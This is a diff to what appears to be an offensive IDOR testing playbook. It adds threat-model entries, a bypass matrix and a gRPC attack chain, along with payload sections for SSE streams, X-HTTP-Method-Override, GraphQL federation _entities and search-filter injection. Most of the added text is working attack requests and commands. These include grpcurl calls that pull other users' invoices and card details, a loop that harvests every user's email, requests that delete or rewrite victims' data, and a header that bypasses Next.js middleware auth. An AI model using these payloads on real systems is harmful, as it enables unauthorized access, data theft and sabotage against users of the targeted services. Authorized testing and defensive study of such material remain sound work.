@@ -1128,7 +1128,7 @@ done
 
 ## Threat Model
 
-> Current patterns as of 2026-05-28. Update each session.
+> Current patterns as of 2026-06-02. Update each session.
 
 **What's being exploited in the wild:**
 
@@ -1239,6 +1239,36 @@ done
     (endCursor), Elasticsearch scroll, MongoDB resume_token, and any `page_token` / `after`
     / `continuation_token` parameter.
 
+19. **gRPC/Protobuf API blind spot** (NEW 2026-06) — gRPC microservice endpoints are the
+    largest completely untested IDOR surface in production stacks. No commercial scanner
+    covers binary protobuf traffic. ACL middleware built for REST/JSON is never applied to
+    gRPC requests. Internal microservices (user-service, billing-service, document-service)
+    expose complete CRUD operations on user data with no per-object auth because they assume
+    only the gateway reaches them. gRPC reflection enabled in production is an instant
+    enumeration win. Use grpcurl — one command reveals the full attack surface.
+
+20. **Server-Sent Events (SSE) IDOR** (NEW 2026-06) — SSE streams are the unidirectional
+    equivalent of WebSocket IDOR. They authenticate at connection (handshake GET) but not
+    per-event. Any SSE endpoint with a user_id, channel_id, or account_id URL parameter is
+    a candidate. SSE connections are invisible to security scanners (they appear as ordinary
+    long-lived GET requests) and are excluded from authorization test plans. Real-time apps
+    built with SSE (notification services, live dashboards, trading feeds) are systematically
+    vulnerable if they don't re-validate channel ownership server-side.
+
+21. **Filter/search parameter injection for mass IDOR** (NEW 2026-06) — Search APIs that
+    accept filter parameters (filter[user_id], created_by, assigned_to, org_id) are
+    mass-disclosure IDOR waiting to be found. One request returns the attacker's complete
+    unauthorized dataset. Multi-tenant SaaS search endpoints with tenant_id or org_id filters
+    are the highest-value target — a single filter substitution returns a competitor's entire
+    data set. More common and higher-yield than single-object IDOR on analytics and BI SaaS.
+
+22. **GraphQL federation subgraph trust gap** (NEW 2026-06) — Apollo Federation's _entities
+    query is a direct channel to every subgraph's data without gateway-level auth. Companies
+    deploying federated GraphQL routinely leave _entities query accessible with no ownership
+    check — it was designed for gateway-to-subgraph trust, but any caller that reaches the
+    endpoint gets the same access. Subgraph ports accidentally exposed to the internet (common
+    in misconfigured Kubernetes ingress) create an even broader blast radius.
+
 ---
 
 ## Bypass Matrix
@@ -1274,6 +1304,11 @@ done
 | Next.js middleware enforces auth | Add `x-middleware-subrequest: middleware` header — skips all middleware (CVE-2025-29927, CVSS 9.1) |
 | Chatbot/AI platform "internal" API | Intercept chatbot XHR in Burp — sequential `lead_id` / `session_id` in internal endpoints → decrement to enumerate all records |
 | Opaque cursor / pagination token | Decode base64 cursor, modify `userId` / `tenantId` / `lastId`, re-encode — pagination scope not re-validated against session |
+| gRPC binary API (no scanner coverage) | Use grpcurl directly — protobuf fields contain same user IDs as REST; ACL middleware never intercepts HTTP/2 binary frames |
+| DELETE/PUT blocked by WAF or ACL | Add `X-HTTP-Method-Override: DELETE` to a GET request — framework executes override, ACL checks only the outer HTTP method |
+| Search returns only your own data | Inject `filter[user_id]=victim_id` — filter scope enforcement often absent; returns victim's full dataset in one request |
+| GraphQL gateway has auth | Query `_entities` directly or reach subgraph port — subgraphs trust gateway, perform no ownership check |
+| SSE stream seems safe (just GET) | Modify `user_id` / `channel_id` URL param in SSE connection — auth checked at handshake only, not per-event |
 
 ---
 
@@ -1311,6 +1346,11 @@ done
 | Next.js middleware-protected routes (any path on unpatched self-hosted Next.js) | Route-level bypass | CVE-2025-29927 — all auth/RBAC bypassed with one header; CVSS 9.1 |
 | Cursor/pagination endpoints (`?cursor=`, `?after=`, `?page_token=`) | Encoded token | Full cross-user data stream access via decoded and re-encoded cursor |
 | Write-only / side-effect endpoints (unsubscribe, delete, mark-read, revoke) | Numeric / GUID | Blind IDOR: silent sabotage with no visible attacker-side data leak |
+| gRPC microservice ports (50051, 3001, 4001, 8001) | Protobuf field (numeric / string) | Entire user data set; unscanned attack surface with no WAF coverage |
+| `/api/events?user_id=`, `/api/stream/users/{id}/` | Numeric / GUID (SSE channel) | Real-time private event stream exfiltration via persistent GET |
+| Search/filter APIs: `?filter[user_id]=`, `?created_by=`, `?org_id=` | Numeric / String | Mass cross-user or cross-tenant data disclosure in a single request |
+| GraphQL `_entities` query on any federated endpoint | Federated entity key (numeric / GUID) | Full cross-user entity data across all federated microservices |
+| Any REST endpoint where DELETE/PUT returns 403 | Any (method override bypass) | X-HTTP-Method-Override: DELETE as a GET bypasses method-specific ACL |
 
 ---
 
@@ -1532,6 +1572,67 @@ Impact: Critical — full authentication + authorization bypass on any unpatched
 self-hosted Next.js (< 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3)
 Note: Vercel-hosted apps are auto-patched; self-hosted Docker/Node deployments are primary targets
 CVE: CVE-2025-29927, CVSS 9.1
+```
+
+### Chain 10: gRPC Reflection IDOR → Microservice Data Breach
+
+```
+1. Target a microservice-heavy SaaS platform — look for:
+   - HTTP/2 binary traffic in Burp (binary frames, not JSON)
+   - .proto files in GitHub repos or leaked in JS error messages
+   - Ports 50051, 3001, 4001, 8001 open on the target's infrastructure
+   - Kubernetes service discovery: nmap the /24 range or use internal DNS
+
+2. Check if gRPC reflection is enabled — instant schema disclosure:
+   grpcurl -plaintext target.com:50051 list
+   → com.example.UserService
+   → com.example.BillingService
+   → com.example.DocumentService
+
+3. Describe the most sensitive service to enumerate all methods:
+   grpcurl -plaintext target.com:50051 describe com.example.BillingService
+   → rpc GetInvoice (GetInvoiceRequest) returns (Invoice) {}
+   → rpc ListUserInvoices (ListUserInvoicesRequest) returns (InvoiceList) {}
+   → rpc GetPaymentMethod (GetPaymentMethodRequest) returns (PaymentMethod) {}
+
+4. Invoke GetInvoice with your own invoice ID (confirm it works):
+   grpcurl -plaintext \
+     -H "Authorization: Bearer <your-token>" \
+     -d '{"invoice_id": "INV-YOUR-001"}' \
+     target.com:50051 com.example.BillingService/GetInvoice
+   → Returns your invoice — access confirmed
+
+5. IDOR: swap invoice ID to another user's — no ownership check at microservice level:
+   grpcurl -plaintext \
+     -H "Authorization: Bearer <your-token>" \
+     -d '{"invoice_id": "INV-VICTIM-001"}' \
+     target.com:50051 com.example.BillingService/GetInvoice
+   → Returns victim's full invoice: amount, billing address, card last4 — IDOR confirmed
+
+6. Enumerate with sequential IDs via ListUserInvoices:
+   grpcurl -plaintext \
+     -H "Authorization: Bearer <your-token>" \
+     -d '{"user_id": 1002}' \
+     target.com:50051 com.example.BillingService/ListUserInvoices
+   → Returns all invoices for user 1002 — mass financial data exposure
+
+7. Escalate to GetPaymentMethod — retrieve stored card details for any user:
+   grpcurl -plaintext \
+     -H "Authorization: Bearer <your-token>" \
+     -d '{"user_id": 1002, "method_id": "pm_1002_visa"}' \
+     target.com:50051 com.example.BillingService/GetPaymentMethod
+   → card_brand, exp_month, exp_year, billing_name, billing_address
+
+8. Automate mass enumeration for all user IDs:
+   for i in $(seq 1 5000); do
+     grpcurl -plaintext -H "Authorization: Bearer <token>" \
+       -d "{\"user_id\": $i}" target.com:50051 \
+       com.example.UserService/GetProfile 2>/dev/null
+   done | jq -r '.email' | sort -u > all_emails.txt
+
+Impact: Critical — full financial and personal data for all users
+Key insight: The REST API has a WAF; gRPC traffic bypasses it entirely.
+The microservice assumes only the internal gateway calls it, not external attackers.
 ```
 
 ---
@@ -1814,3 +1915,263 @@ GET /api/search/scroll HTTP/1.1
 → Continues victim's search session, returns their scoped results
 ```
 **Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## IDOR in gRPC / Protobuf APIs
+**Reference type:** Numeric / String (protobuf message field)
+**API pattern:** gRPC (HTTP/2 + Protocol Buffers)
+**Authorization flaw:** gRPC service methods that accept a user-scoped resource identifier (user_id, document_id, account_id) as a protobuf field perform no server-side ownership check. ACL middleware built for REST/JSON doesn't intercept gRPC traffic because it arrives as HTTP/2 binary frames. Security scanners ignore gRPC endpoints entirely — they are the highest-ratio "untested" API surface in modern microservice architectures.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Full CRUD access to any user's resources via an entirely unprotected API surface. Critical because gRPC services are often internal microservices with elevated trust, broader data access, and zero WAF or scanner coverage.
+**Test payload:**
+```
+# Step 1: Discover gRPC endpoints
+# Indicators: content-type: application/grpc, HTTP/2 binary traffic in Burp,
+# .proto files in JS bundles/repos, gRPC reflection enabled on server
+
+grpcurl -plaintext target.com:50051 list
+# → com.example.UserService
+# → com.example.DocumentService
+
+# Step 2: Check if gRPC reflection is enabled (exposes all services and methods):
+grpcurl -plaintext target.com:50051 describe com.example.DocumentService
+# → rpc GetDocument (GetDocumentRequest) returns (Document)
+# → rpc DeleteDocument (DeleteDocumentRequest) returns (DeleteDocumentResponse)
+
+# Step 3: Invoke with your own ID (confirm access):
+grpcurl -plaintext \
+  -H "Authorization: Bearer <your-token>" \
+  -d '{"document_id": "YOUR_DOC_ID", "user_id": "YOUR_USER_ID"}' \
+  target.com:50051 com.example.DocumentService/GetDocument
+
+# Step 4: Swap to another user's document_id — if returned → IDOR confirmed:
+grpcurl -plaintext \
+  -H "Authorization: Bearer <your-token>" \
+  -d '{"document_id": "VICTIM_DOC_ID", "user_id": "YOUR_USER_ID"}' \
+  target.com:50051 com.example.DocumentService/GetDocument
+
+# Step 5: Test write methods — delete another user's document:
+grpcurl -plaintext \
+  -H "Authorization: Bearer <your-token>" \
+  -d '{"document_id": "VICTIM_DOC_ID"}' \
+  target.com:50051 com.example.DocumentService/DeleteDocument
+
+# gRPC-Web (intercepted in Burp as HTTP/1.1):
+# Appears as: POST /com.example.DocumentService/GetDocument
+# Body is binary protobuf — decode with: protoc --decode_raw < body.bin
+# Or install Burp's protobuf decoder extension
+
+# Sequential numeric ID sweep via gRPC:
+for i in $(seq 1001 1010); do
+  grpcurl -plaintext -H "Authorization: Bearer <token>" \
+    -d "{\"user_id\": $i}" target.com:50051 com.example.UserService/GetProfile
+done
+
+# Tools: grpcurl (CLI), BloomRPC, Postman gRPC tab, Evans CLI, Burp + protobuf decoder
+```
+**Source:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
+
+---
+
+## IDOR via Server-Sent Events (SSE)
+**Reference type:** Numeric / GUID (stream channel ID)
+**API pattern:** REST (EventSource / text/event-stream)
+**Authorization flaw:** SSE endpoints authenticate at the connection level (via session cookie or token in the initial GET) but accept a user-scoped channel or user ID as a URL parameter or path segment. Once connected, the server streams all events for the specified channel ID without re-verifying ownership. SSE connections appear as ordinary long-lived GET requests — they are almost never included in authorization testing methodology or scanner scope.
+**Escalation:** Horizontal
+**Business impact:** Real-time exfiltration of another user's live event stream — order updates, notifications, chat messages, system alerts, financial transactions — via a single persistent GET request that blends into normal application traffic.
+**Test payload:**
+```http
+# Step 1: Find SSE in Burp — indicators:
+# - Response Content-Type: text/event-stream
+# - Long-lived GET with chunked "data: ..." lines
+# - Browser DevTools → Network → filter: "eventsource"
+
+# Normal SSE subscription (your own account):
+GET /api/events?user_id=1001 HTTP/1.1
+Accept: text/event-stream
+Cookie: session=<your-session>
+→ data: {"type":"order_update","orderId":"ORD-9981","status":"shipped"}
+
+# IDOR: Subscribe to another user's event stream:
+GET /api/events?user_id=1002 HTTP/1.1
+Accept: text/event-stream
+Cookie: session=<your-session>
+→ If server streams user 1002's events → IDOR confirmed
+
+# Path-segment variant:
+GET /api/stream/users/1002/notifications HTTP/1.1
+Accept: text/event-stream
+
+# Channel-ID variant:
+GET /api/events/channel/ch_1002_live HTTP/1.1
+Accept: text/event-stream
+Authorization: Bearer <your-token>
+
+# Tenant-level SSE IDOR:
+GET /api/events/feed?org_id=competitor-org HTTP/1.1
+GET /api/notifications/stream?account=ACC-1002 HTTP/1.1
+
+# JavaScript browser test:
+const es = new EventSource('/api/events?user_id=1002', {withCredentials: true});
+es.onmessage = (e) => console.log(e.data);
+// If victim's events arrive → IDOR confirmed
+
+# Find SSE endpoints in JS source:
+# grep -r "EventSource\|text/event-stream" *.js
+# grep -r "/api/events\|/api/stream\|/api/feed\|/sse" *.js
+```
+**Source:** https://portswigger.net/web-security/websockets
+
+---
+
+## IDOR via X-HTTP-Method-Override
+**Reference type:** Any (numeric / GUID / hash)
+**API pattern:** REST
+**Authorization flaw:** Many REST frameworks support HTTP method override via `X-HTTP-Method-Override`, `X-Method-Override`, `X-HTTP-Method` headers, or `_method` POST body parameter. The framework executes the override method. ACL middleware that evaluates access based on the actual HTTP method (e.g., allowing GET but blocking DELETE) doesn't apply the DELETE check when the request arrives as GET + override header — the outer method passes the ACL check while the inner override executes the privileged operation on the target object.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Delete, modify, or replace another user's resources using a GET or POST that bypasses method-specific ACL rules. Particularly effective when firewalls or WAFs block DELETE/PUT/PATCH but allow GET.
+**Test payload:**
+```http
+# Baseline: DELETE blocked by ACL for non-owner
+DELETE /api/users/1002/posts/5001 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 403 Forbidden
+
+# Method override via header — ACL sees GET, framework executes DELETE:
+GET /api/users/1002/posts/5001 HTTP/1.1
+Authorization: Bearer <your-token>
+X-HTTP-Method-Override: DELETE
+→ 200 OK (post deleted — ACL checked GET permission, DELETE executed)
+
+# Try all override header variants:
+X-HTTP-Method-Override: DELETE
+X-Method-Override: DELETE
+X-HTTP-Method: DELETE
+
+# POST body parameter override (Rails/Laravel pattern):
+POST /api/users/1002/posts/5001 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+_method=DELETE
+
+# Modify another user's data via hidden PUT:
+POST /api/users/1002/profile HTTP/1.1
+Content-Type: application/json
+X-HTTP-Method-Override: PUT
+Authorization: Bearer <your-token>
+{"email": "attacker@evil.com"}
+
+# Frameworks that support method override:
+# Rails (ActionDispatch)          → _method form body
+# Express (method-override npm)   → X-HTTP-Method-Override header
+# Laravel                         → X-HTTP-Method-Override or _method
+# Spring Boot (HiddenHttpMethodFilter) → _method
+# Django REST Framework           → HTTP_X_HTTP_METHOD_OVERRIDE
+
+# Detection:
+# 1. OPTIONS /api/resource → check Allow header for DELETE/PUT/PATCH
+# 2. Try the restricted method directly → note 403
+# 3. Retry as GET + X-HTTP-Method-Override: <blocked_method>
+```
+**Source:** https://portswigger.net/web-security/access-control
+
+---
+
+## IDOR in GraphQL Federation (Subgraph Entity Bypass)
+**Reference type:** Numeric / GUID (federated entity key)
+**API pattern:** GraphQL (Apollo Federation, Hasura Remote Schema, WunderGraph)
+**Authorization flaw:** In federated GraphQL, the gateway applies authentication and coarse authorization. Individual subgraph microservices are assumed internal-only and implement no per-object ownership validation — they trust the gateway to have validated the caller. The federation `_entities` query resolves entities by key across subgraphs. When an attacker queries `_entities` directly or reaches an exposed subgraph port, the subgraph resolves any entity key without ownership verification, bypassing the gateway entirely.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Full access to any user's entity data across all federated microservices (billing, medical, contracts, profiles). Federation is rapidly adopted in enterprise GraphQL stacks and is systematically undertested — subgraph services typically hold the most sensitive domain data with no independent authorization layer.
+**Test payload:**
+```graphql
+# Step 1: Identify a federated GraphQL endpoint — indicators:
+# - _service query works: query { _service { sdl } }
+# - _entities query is present in schema introspection
+# - @key directives visible in SDL output
+# - Multiple service types with cross-service entity references
+
+# Step 2: Get SDL to enumerate all entity types and key fields:
+{"query": "{ _service { sdl } }"}
+# → Parse @key directives: type User @key(fields: "id") { id email phone ... }
+
+# Step 3: Probe _entities with another user's key:
+{
+  "query": "query { _entities(representations: [{__typename: \"User\", id: \"1002\"}]) { ... on User { id email phone paymentMethods { last4 } } } }"
+}
+# → If returns user 1002's data → IDOR via federation entity resolution
+
+# Step 4: Test other entity types:
+{"query": "{ _entities(representations: [{__typename: \"Order\", id: \"ORD-9982\"}]) { ... on Order { items total shippingAddress } } }"}
+{"query": "{ _entities(representations: [{__typename: \"Invoice\", id: \"INV-1042\"}]) { ... on Invoice { amount pdfUrl customerDetails } } }"}
+{"query": "{ _entities(representations: [{__typename: \"Document\", id: \"DOC-5531\"}]) { ... on Document { content owner classification } } }"}
+
+# Step 5: Direct subgraph request when port is exposed:
+# Subgraphs on internal ports 3001, 4001, 8001 or /subgraph/* paths
+POST /api/user-service/graphql HTTP/1.1
+Content-Type: application/json
+{"query": "{ user(id: \"1002\") { email phone address } }"}
+# → No auth check at subgraph level → data returned
+
+# Batch entity mass enumeration in one request:
+{
+  "query": "query { _entities(representations: [{__typename:\"User\",id:\"1001\"},{__typename:\"User\",id:\"1002\"},{__typename:\"User\",id:\"1003\"}]) { ... on User { id email } } }"
+}
+
+# Tools: Apollo Studio Explorer, graphql-cop, InQL Burp extension, Altair
+```
+**Source:** https://www.apollographql.com/docs/federation/; https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control
+
+---
+
+## IDOR via Search / Filter Parameter Injection
+**Reference type:** Numeric / String (query filter value)
+**API pattern:** REST / GraphQL
+**Authorization flaw:** Search and filter APIs expose parameters such as `filter[owner_id]`, `search[user_id]`, `q=author:X`, `assigned_to=Y`, or `created_by=Z` that control which user's data is returned. The backend queries the database using these values directly without enforcing that the filter scope matches the authenticated session. An authenticated attacker substitutes another user's ID in a filter parameter and receives a full unauthorized data dump in a single API response.
+**Escalation:** Horizontal / Tenant isolation
+**Business impact:** Mass exfiltration of any user's complete object collection (tasks, tickets, orders, documents) via a single filtered request. Unlike single-object IDOR, filter injection returns all matching objects in one response. Particularly severe in multi-tenant SaaS where `org_id` or `tenant_id` substitution returns competitor data.
+**Test payload:**
+```http
+# Normal search (your own data):
+GET /api/tickets?filter[user_id]=1001&status=open HTTP/1.1
+Authorization: Bearer <your-token>
+→ Returns your 12 open tickets
+
+# Filter injection — substitute victim's user_id:
+GET /api/tickets?filter[user_id]=1002&status=open HTTP/1.1
+Authorization: Bearer <your-token>
+→ If returns user 1002's tickets → mass IDOR confirmed
+
+# Common filter parameter patterns to test:
+GET /api/orders?created_by=1002
+GET /api/documents?owner=user_1002
+GET /api/tasks?assigned_to=1002&project_id=PRJ-001
+GET /api/messages?sender_id=1002
+GET /api/reports?org_id=competitor-org-id       ← tenant IDOR
+GET /api/audit_logs?actor_id=1002               ← another user's action history
+
+# JSON:API filter syntax (Rails/Ember apps):
+GET /api/posts?filter[author.id]=1002
+GET /api/files?filter[uploaded_by]=user:1002
+
+# GraphQL where-clause filter IDOR:
+query {
+  tickets(where: { userId: { eq: "1002" } }) {
+    id title priority assignee { email }
+  }
+}
+
+# Elasticsearch filter injection via search API:
+POST /api/search HTTP/1.1
+Content-Type: application/json
+{"query": {"term": {"user_id": "1002"}}, "size": 1000}
+→ Returns all of user 1002's indexed documents
+
+# Range sweep for mass enumeration:
+GET /api/orders?filter[user_id][gte]=1&filter[user_id][lte]=9999
+
+# High-priority filter params to test:
+# user_id, owner, creator, author, assigned_to, submitted_by,
+# created_by, updated_by, tenant_id, org_id, company_id, account_id
+```
+**Source:** https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
